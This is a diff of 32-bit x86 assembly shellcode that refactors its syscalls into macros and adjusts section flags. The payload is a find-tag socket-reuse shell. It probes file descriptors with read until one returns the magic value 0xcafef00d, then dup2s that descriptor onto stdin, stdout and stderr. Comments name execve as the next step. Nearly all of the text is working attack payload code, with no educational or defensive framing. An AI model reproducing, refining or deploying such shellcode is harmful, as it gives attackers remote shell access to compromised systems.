@@ -3,15 +3,20 @@
 	;; Mon Mar  4 12:03:49 EST 2013
 	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
 	;; read = 3, dup2 = 63, execve = 11
-	%include "short32.s"
-
+	
 	%define MAGIC dword 0xcafef00d
 BITS 32
 global main
 
 %ifdef ELF
-	section .mytext progbits alloc  write
+	section mytext write exec alloc 
 %endif
+	;; move the includes down here because 'write' appears in the
+	;; section header
+	
+%include "short32.s"
+%include "syscall.s"
+
 	
 main:
 	mov ecx,esp 		; TODO is this too early?
@@ -26,13 +31,15 @@ main:
 ourread:
 	dec ebx 
 	jnz ourread.next
+
+%ifdef DEBUG
 	int 3			;debugging, do something else in prod
 	;; this breakpoint should trigger if we DON'T find the magic number
+%endif
+	
 .next:
 	; sets up read
-	xor eax,eax
-	mov al, read 		;eax	
-	int 0x80		;read eax=3
+	SYSTEM_CALL(read)
 	cmp al,4  		;check to see if we've received our 4 bytes
 	jnz ourread  		;if not, try with another file descriptor
 	;;TODO: lets get rid of this cmp al,4 nonsense and save some bytes.
@@ -47,9 +54,7 @@ mydup2:
 	xor ecx,ecx 
 	mov cl, 2
 .copy:
-	xor eax,eax 	; because we need to nuke the retval of dup2
-	mov al,dup2	;dup2
-	int 0x80
+	SYSTEM_CALL(dup2)
 	dec ecx    	; this is for looping stderr/out/in
 	jns mydup2.copy
 
